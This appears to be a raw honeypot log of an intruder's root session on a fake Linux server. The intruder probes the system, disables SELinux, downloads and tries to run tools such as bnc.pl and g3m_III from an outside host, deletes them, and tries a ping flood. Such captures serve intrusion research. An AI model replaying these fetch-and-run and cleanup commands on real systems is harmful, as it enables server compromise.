@@ -1,0 +1,512 @@
+[4hAWSWeb:~# apt--[1D[1Pget instgall[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptall htop
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  htop 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 492.2kB of archives.
+After this operation, 1082.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main htop 1.29-1 [492.2kB]
+Fetched 492.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking htop (from .../archives/htop_1.29-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up htop (1.29-1) ...
+[4hAWSWeb:~# htop
+[4lhtop: Segmentation fault
+[4hAWSWeb:~# apt-get clear
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# cle[1D[1Pear
+[4lc[4hAWSWeb:~# ps -x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps -x
+[4hAWSWeb:~# echo e vc satanas ?
+[4le vc satanas ?
+[4hAWSWeb:~# [Kecho e vc satanas ?|sou
+[4le vc satanas ?|sou
+[4hAWSWeb:~# [Kecho e vc satanas ?|sou[1D[1P[1D[1P[1D[1P[1D[1P|grep sou
+[4le vc satanas ?|grep sou
+[4hAWSWeb:~# [Kecho e vc satanas ?|grep sou[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano 1
+bash: nano: command not found
+AWSWeb:~# [Knano 1[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Papt-get install an[1D[1P[1D[1Pnano
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nano 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 176.2kB of archives.
+After this operation, 387.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main nano 1.7-10 [176.2kB]
+Fetched 176.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking nano (from .../archives/nano_1.7-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up nano (1.7-10) ...
+[4hAWSWeb:~# [Kapt-get install nano[20D[Knano 1
+[4lnano: Segmentation fault
+[4hAWSWeb:~# v[1D[1Pid
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hAWSWeb:~# clear
+[4lc[4hAWSWeb:~# rpm
+bash: rpm: command not found
+AWSWeb:~# ls
+[4l[4hAWSWeb:~# ls -a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# w
+[4l 23:49:08 up 150 days, 1:53,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    189.1.61.150      23:43    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# w
+[4l 23:50:27 up 150 days, 1:54,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    189.1.61.150      23:43    0.09   0.05   0.05 w
+[4hAWSWeb:~# upgrade
+bash: upgrade: command not found
+AWSWeb:~# get
+bash: get: command not found
+AWSWeb:~# wget -O /etc/yum.repos.d/epel-erlang.repo http://repos.fedorapeople.org/repos/peter/erlang/epel-erlang.repo
+[4l--2013-06-23 23:52:21--  http:///etc/yum.repos.d/epel-erlang.repo
+Connecting to :80... connected.
+HTTP request sent, awaiting response... Connection was refused by other side: 111: Connection refused.
+[4hAWSWeb:~# iftop
+bash: iftop: command not found
+AWSWeb:~# h[1D[1Piptraf
+bash: iptraf: command not found
+AWSWeb:~# ping
+[4lUsage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
+            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
+            [-M mtu discovery hint] [-S sndbuf]
+            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
+[4hAWSWeb:~# clear
+[4lc[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# h[1D[1Pgcc
+bash: gcc: command not found
+AWSWeb:~# make
+bash: make: command not found
+AWSWeb:~# gmake
+bash: gmake: command not found
+AWSWeb:~# apt-get updare[1D[1P[1D[1Pte
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# [Kapt-get update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# yum
+bash: yum: command not found
+AWSWeb:~# [Kyum[3D[Kapt-get[7D[Kapt-get update[14D[Kapt-get install yum
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  yum 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 868.2kB of archives.
+After this operation, 1909.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main yum 1.18-7 [868.2kB]
+Fetched 868.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking yum (from .../archives/yum_1.18-7_i386.deb) ...
+Processing triggers for man-db ...
+Setting up yum (1.18-7) ...
+[4hAWSWeb:~# yum
+[4lyum: Segmentation fault
+[4hAWSWeb:~# [Kyum[3D[Kapt-get install yum[1D[1P[1D[1P[1D[1Pupgrade
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  upgrade 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 136.2kB of archives.
+After this operation, 299.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main upgrade 0.40-5 [136.2kB]
+Fetched 136.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking upgrade (from .../archives/upgrade_0.40-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up upgrade (0.40-5) ...
+[4hAWSWeb:~# [Kapt-get install upgrade[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pdate
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  update 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 212.2kB of archives.
+After this operation, 466.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main update 0.17-9 [212.2kB]
+Fetched 212.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking update (from .../archives/update_0.17-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up update (0.17-9) ...
+[4hAWSWeb:~# [Kapt-get install update[22D[Kapt-get install upgrade[23D[Kyum[3D[Kapt-get install yum[19D[Kyum[1D
+[4lyum: Segmentation fault
+[4hAWSWeb:~# clear
+[4lc[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# ls -a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# cd ..
+[4l[4hAWSWeb:/# ls -a
+[4l.          ..         sys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        initrd.img lib        
+home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# setenforce 0
+bash: setenforce: command not found
+AWSWeb:/# [Ksetenforce 0[12D[Kls -a[5D[Kcd ..[5D[Kls -a[5D[Kls[2D[Kclear[5D[Kyum[3D[Kapt-get install update[22D[Kapt-get install upgrade[23D[Kyum[3D[Kapt-get install yum[19D[Kyum[3D[Kapt-get[7D[Kapt-get update[14D[Kgmake[5D[Kmake[4D[Kgcc[3D[Kls[2D[Kclear[5D[Kping[4D[Kiptraf[6D[Kiftop[5D[Kwget -O /etc/yum.repos.d/epel-erlang.repo http://repos.fedorapeople.org/repos/peter/erlang/epel-erlang.repo[107D[Kget[3D[Kupgrade[7D[Kw[1D[Kuname -a[8D[Kw[1D[Kls -a[5D[Kls[2D[Krpm[3D[Kclear[5D[Kps[2D[Kid[2D[Knano 1[6D[Kapt-get install nano[20D[Knano 1[6D[Kecho e vc satanas ?|grep sou[28D[Kecho e vc satanas ?|sou[23D[Kecho e vc satanas ?[19D[Kps -x[5D[Kclear[5D[Kapt-get clear[13D[Khtop[4D[Kapt-get install htop[20D[Khtop[4D[Kapt-get clear[13D[Kclear[5D[Kps -x[5D[Kecho e vc satanas ?[19D[Kecho e vc satanas ?|sou[23D[Kecho e vc satanas ?|grep sou[28D[Knano 1[6D[Kapt-get install nano[20D[Knano 1[6D[Kid[2D[Kps[2D[Kclear[5D[Krpm[3D[Kls[2D[Kls -a[5D[Kw[1D[Kuname -a[8D[Kw[1D[Kupgrade[7D[Kget[3D[Kwget -O /etc/yum.repos.d/epel-erlang.repo http://repos.fedorapeople.org/repos/peter/erlang/epel-erlang.repo[107D[Kiftop[5D[Kiptraf[6D[Kping[4D[Kclear[5D[Kls[2D[Kgcc[3D[Kmake[4D[Kgmake[5D[Kapt-get update[14D[Kapt-get[7D[Kyum[3D[Kapt-get install yum[19D[Kyum[3D[Kapt-get install upgrade[23D[Kapt-get install update[22D[Kyum[3D[Kclear[5D[Kls[2D[Kls -a[5D[Kcd ..[5D[Kls -a[5D[Ksetenforce 0[12D[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kclear
+[4lc[4hAWSWeb:/# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        
+proc       sbin       etc        dev        srv        initrd.img lib        home       var        
+usr        boot       root       lost+found 
+[4hAWSWeb:/# cd go[1D[1P[1D[1Ph[1D[1P[1D[1P[1D[1P[1D[1Pcd home/
+[4l[4hAWSWeb:/home# ls
+[4lrichard 
+[4hAWSWeb:/home# cc[1D[1P[1D[1Pcd d[1D[1Pr[1D[1P[1D[1P[1D[1P[1D[1Pcd richard/
+[4l[4hAWSWeb:/home/richard# ls
+[4l[4hAWSWeb:/home/richard# cd ..
+[4l[4hAWSWeb:/home# clear
+[4lc[4hAWSWeb:/home# ls
+[4lrichard 
+[4hAWSWeb:/home# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        
+proc       sbin       etc        dev        srv        initrd.img lib        home       var        
+usr        boot       root       lost+found 
+[4hAWSWeb:/# w
+[4l 00:02:33 up 150 days, 2:6,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    189.1.61.150      23:43    0.09   0.05   0.05 w
+[4hAWSWeb:/# time
+bash: time: command not found
+AWSWeb:/# cat
+[4l[4hAWSWeb:/# cat /proc/cpuinfo |grep proc |wc -l
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+cat: |grep: No such file or directory
+cat: /proc: Is a directory
+cat: |wc: No such file or directory
+cat: -l: No such file or directory
+[4hAWSWeb:/# [Kcat /proc/cpuinfo |grep proc |wc -l[35D[K[Kmemx
+bash: memx: command not found
+AWSWeb:/# [Kmemx[1D[1P[1D[1Px[1D[1Pnx
+bash: menx: command not found
+AWSWeb:/# apt-get update3
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/# apt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/# [Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[30D[Kapt-get update3[15D[Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[72D[Kapt-get update3[15D[Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[114D[K[K[K[Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[114D[K[Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1P[1D[1P[1D[1P
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  linuxheadersgeneric linuxgeneric linuxrestrictedmodulesgeneric4 linuximagegeneric linux 
+0 upgraded, 5 newly installed, 0 to remove and 259 not upgraded.
+Need to get 2386.2kB of archives.
+After this operation, 5249.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main linuxheadersgeneric 0.13-1 [430.2kB]
+Get:2 http://ftp.debian.org stable/main linuxgeneric 0.14-6 [731.2kB]
+Get:3 http://ftp.debian.org stable/main linuxrestrictedmodulesgeneric4 1.14-7 [493.2kB]
+Get:4 http://ftp.debian.org stable/main linuximagegeneric 0.38-5 [338.2kB]
+Get:5 http://ftp.debian.org stable/main linux 0.25-1 [394.2kB]
+Fetched 2386.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking linuxheadersgeneric (from .../archives/linuxheadersgeneric_0.13-1_i386.deb) ...
+Unpacking linuxgeneric (from .../archives/linuxgeneric_0.14-6_i386.deb) ...
+Unpacking linuxrestrictedmodulesgeneric4 (from .../archives/linuxrestrictedmodulesgeneric4_1.14-7_i386.deb) ...
+Unpacking linuximagegeneric (from .../archives/linuximagegeneric_0.38-5_i386.deb) ...
+Unpacking linux (from .../archives/linux_0.25-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up linuxheadersgeneric (0.13-1) ...
+Setting up linuxgeneric (0.14-6) ...
+Setting up linuxrestrictedmodulesgeneric4 (1.14-7) ...
+Setting up linuximagegeneric (0.38-5) ...
+Setting up linux (0.25-1) ...
+[4hAWSWeb:/# [Kapt-get install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[111D[Kapt-get -y install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[114D[Kapt-get update3[15D[Kmenx[4D[Kmemx[4D[Kcat /proc/cpuinfo |grep proc |wc -l[35D[Kcat[3D[Ktime[4D[Kw[1D[Kls[2D[Kcd ..[5D[Kls[2D[Kclear[5D[Kcd ..[5D[Kls[2D[Kcd richard/[11D[Kls[2D[Kcd home/[8D[Kls[2D[Kcd ..[5D[Kclear[5D[Ksetenforce 0[12D[Kls -a[5D[Kcd ..[5D[Kls -a[5D[Kls[2D[Kclear[5D[Kyum[3D[Kapt-get install update[22D[Kapt-get install upgrade
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  upgrade 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 601.2kB of archives.
+After this operation, 1322.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main upgrade 0.15-7 [601.2kB]
+Fetched 601.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking upgrade (from .../archives/upgrade_0.15-7_i386.deb) ...
+Processing triggers for man-db ...
+Setting up upgrade (0.15-7) ...
+[4hAWSWeb:/# perl
+bash: perl: command not found
+AWSWeb:/# [Kperl[4D[Kapt-get install upgrade[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ppel[1D[1Prl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 588.2kB of archives.
+After this operation, 1293.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.17-5 [588.2kB]
+Fetched 588.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.17-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.17-5) ...
+[4hAWSWeb:/# perl
+[4lperl: Segmentation fault
+[4hAWSWeb:/# [Kperl[4D[Kapt-get install perl[20D[Kperl[4D[Kapt-get install upgrade[23D[Kapt-get install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  linuxheadersgeneric linuxgeneric linuxrestrictedmodulesgeneric4 linuximagegeneric linux 
+0 upgraded, 5 newly installed, 0 to remove and 259 not upgraded.
+Need to get 2275.2kB of archives.
+After this operation, 5005.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main linuxheadersgeneric 0.16-7 [311.2kB]
+Get:2 http://ftp.debian.org stable/main linuxgeneric 1.1-5 [716.2kB]
+Get:3 http://ftp.debian.org stable/main linuxrestrictedmodulesgeneric4 1.1-10 [782.2kB]
+Get:4 http://ftp.debian.org stable/main linuximagegeneric 1.7-9 [130.2kB]
+Get:5 http://ftp.debian.org stable/main linux 1.8-5 [336.2kB]
+Fetched 2275.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking linuxheadersgeneric (from .../archives/linuxheadersgeneric_0.16-7_i386.deb) ...
+Unpacking linuxgeneric (from .../archives/linuxgeneric_1.1-5_i386.deb) ...
+Unpacking linuxrestrictedmodulesgeneric4 (from .../archives/linuxrestrictedmodulesgeneric4_1.1-10_i386.deb) ...
+Unpacking linuximagegeneric (from .../archives/linuximagegeneric_1.7-9_i386.deb) ...
+Unpacking linux (from .../archives/linux_1.8-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up linuxheadersgeneric (0.16-7) ...
+Setting up linuxgeneric (1.1-5) ...
+Setting up linuxrestrictedmodulesgeneric4 (1.1-10) ...
+Setting up linuximagegeneric (1.7-9) ...
+Setting up linux (1.8-5) ...
+[4hAWSWeb:/# echo 'deb http://archive.ubuntu.com/ubuntu/ hardy universe' | sudo tee /etc/apt/sources.list.d/fwcutter.list
+[4ldeb http://archive.ubuntu.com/ubuntu/ hardy universe | sudo tee /etc/apt/sources.list.d/fwcutter.list
+[4hAWSWeb:/# [Kecho 'deb http://archive.ubuntu.com/ubuntu/ hardy universe' | sudo tee /etc/apt/sources.list.d/fwcutter.list[108D[Kapt-get install linux linux-generic linux-headers-generic linux-image-generic linux-restricted-modules-generic4[111D[Kperl[4D[Kapt-get install perl[1D[1P[1D[1P[1D[1P[1D[1Psudo
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  sudo 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 613.2kB of archives.
+After this operation, 1348.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main sudo 1.17-2 [613.2kB]
+Fetched 613.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking sudo (from .../archives/sudo_1.17-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up sudo (1.17-2) ...
+[4hAWSWeb:/# sudo apt-get update
+[4lsudo: Segmentation fault
+[4hAWSWeb:/# cat /proc/meminfo
+[4lcat: /proc/meminfo: No such file or directory
+[4hAWSWeb:/# [Kcat /proc/meminfo[17D[K[Kfree -k
+bash: free: command not found
+AWSWeb:/# w[1D[1Pcd /root
+[4l[4hAWSWeb:~# c[1D[1Pwget http://repositorio.allalla.com/bnc.pl
+[4l--2013-06-24 00:12:09--  http://repositorio.allalla.com/bnc.pl
+Connecting to repositorio.allalla.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 118370 (115K) [text/plain]
+Saving to: `bnc.pl
+
+ 1% [>                                      ] 1,234        16K/s  eta 6s100%[======================================>] 118,370      16K/s
+
+2013-06-24 00:12:09 (16 KB/s) - `bnc.pl' saved [118370/118370]
+[4hAWSWeb:~# .[1D[1Pchnod [1D[1P[1D[1P[1D[1P[1D[1Pmod +x *
+[4l[4hAWSWeb:~# ./b[1D[1P[1D[1P[1D[1P./bnc.pl 
+bash: ./bnc.pl: command not found
+AWSWeb:~# [K./bnc.pl [1D[1P
+bash: ./bnc.pl: command not found
+AWSWeb:~# [K./bnc.pl[1D[1D[1D[1D[1D[1D[1D[1D[1P[1Pperl 
+[4lperl: Segmentation fault
+[4hAWSWeb:~# [Kperl bnc.pl[11D[K./bnc.pl[8D[K./bnc.pl [9D[Kchmod +x *[10D[K./bnc.pl [9D[K./bnc.pl[8D[Kperl bnc.pl[11D[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Krm -rf v[1D[1Pb[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm -rf bnc.pl 
+[4l[4hAWSWeb:~# [Krm -rf bnc.pl [14D[Kperl bnc.pl[11D[K./bnc.pl[8D[K./bnc.pl [9D[Kchmod +x *[10D[Kwget http://repositorio.allalla.com/bnc.pl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pl
+[4l--2013-06-24 00:13:06--  http://repositorio.allalla.com/l
+Connecting to repositorio.allalla.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 68005 (66K) [text/plain]
+Saving to: `l
+
+ 8% [===>                                   ] 5,615        128K/s  eta 0s100%[======================================>] 68,005       128K/s
+
+2013-06-24 00:13:06 (128 KB/s) - `l' saved [68005/68005]
+[4hAWSWeb:~# [Kwget http://repositorio.allalla.com/l[37D[Krm -rf bnc.pl [14D[Kperl bnc.pl[11D[K./bnc.pl[8D[K./bnc.pl [9D[Kchmod +x *
+[4l[4hAWSWeb:~# ./l
+bash: ./l: command not found
+AWSWeb:~# c[1D[1Pperl l
+[4lperl: Segmentation fault
+[4hAWSWeb:~# javac
+bash: javac: command not found
+AWSWeb:~# [Kjavac[1D[1P
+bash: java: command not found
+AWSWeb:~# [Kjava[4D[Kjavac[5D[Kperl l[6D[K./l[3D[Kchmod +x *[10D[Kwget http://repositorio.allalla.com/l[1D[1Pg3m_III
+[4l--2013-06-24 00:13:53--  http://repositorio.allalla.com/g3m_III
+Connecting to repositorio.allalla.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18660 (18K) [text/plain]
+Saving to: `g3m_III
+
+61% [=======================>               ] 11,455       196K/s  eta 0s100%[======================================>] 18,660       196K/s
+
+2013-06-24 00:13:53 (196 KB/s) - `g3m_III' saved [18660/18660]
+[4hAWSWeb:~# [Kwget http://repositorio.allalla.com/g3m_III[43D[K./g[1D[1P[1D[1P[1D[1P./g3m_III 
+bash: ./g3m_III: command not found
+AWSWeb:~# chmod .x [1D[1P[1D[1P[1D[1P+x *
+[4l[4hAWSWeb:~# [Kchmod +x *[10D[K./g3m_III [10D[Kwget http://repositorio.allalla.com/g3m_III[43D[K./g3m_III 
+bash: ./g3m_III: command not found
+AWSWeb:~# rm -rf *
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# iptables
+bash: iptables: command not found
+AWSWeb:~# 
+AWSWeb:~# ps -x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps -x
+[4hAWSWeb:~# reset
+bash: reset: command not found
+AWSWeb:~# restore
+bash: restore: command not found
+AWSWeb:~# clear
+[4lc[4hAWSWeb:~# ping
+[4lUsage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
+            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
+            [-M mtu discovery hint] [-S sndbuf]
+            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
+[4hAWSWeb:~# ping<space>site IP<space> -t -l 6400[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1D[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P 
+[4lPING 6400 (214.218.188.196) 56(84) bytes of data.
+64 bytes from 6400 (214.218.188.196): icmp_seq=1 ttl=50 time=40.1 ms
+64 bytes from 6400 (214.218.188.196): icmp_seq=2 ttl=50 time=43.1 ms
+64 bytes from 6400 (214.218.188.196): icmp_seq=3 ttl=50 time=42.5 ms
+--- 6400 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# w
+[4l 00:20:18 up 150 days, 2:24,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    189.1.61.150      23:43    0.09   0.05   0.05 w
+[4hAWSWeb:~# [Kw[1D[Kping -t -l 6400[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1D189.1.61.150[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D 
+[4lPING 189.1.61.150 (189.1.61.150) 56(84) bytes of data.
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=1 ttl=50 time=42.0 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=2 ttl=50 time=45.9 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=3 ttl=50 time=49.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=4 ttl=50 time=48.1 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=5 ttl=50 time=49.9 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=6 ttl=50 time=47.8 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=7 ttl=50 time=46.6 ms
